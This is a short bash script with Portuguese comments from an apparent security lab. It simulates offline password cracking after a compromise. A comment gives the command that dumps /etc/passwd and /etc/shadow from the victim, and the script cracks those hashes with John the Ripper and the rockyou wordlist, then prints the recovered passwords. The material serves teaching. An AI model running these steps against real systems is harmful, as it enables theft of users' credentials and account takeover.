#!/usr/bin/env bash
#
# Ataque OFFLINE: quebra de hashes de senha com John the Ripper.
# Simula o cenario pos-comprometimento, em que o atacante ja obteve os hashes
# do sistema e os quebra fora da maquina alvo.
#
# IMPORTANTE: o arquivo de hashes e gerado na VITIMA e transferido para a Kali.
#   Na VITIMA (Ubuntu):
#       sudo unshadow /etc/passwd /etc/shadow > hashes.txt
#   ATENCAO: nao versione hashes de contas pessoais reais. Mantenha apenas os
#   usuarios de laboratorio (fraco/medio/dificil) ou nao suba este arquivo.
#
set -euo pipefail

HASHES="./hashes.txt"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "[*] Quebrando hashes com a wordlist rockyou..."
john --wordlist="$WORDLIST" "$HASHES"

echo "[*] Senhas recuperadas:"
john --show "$HASHES"
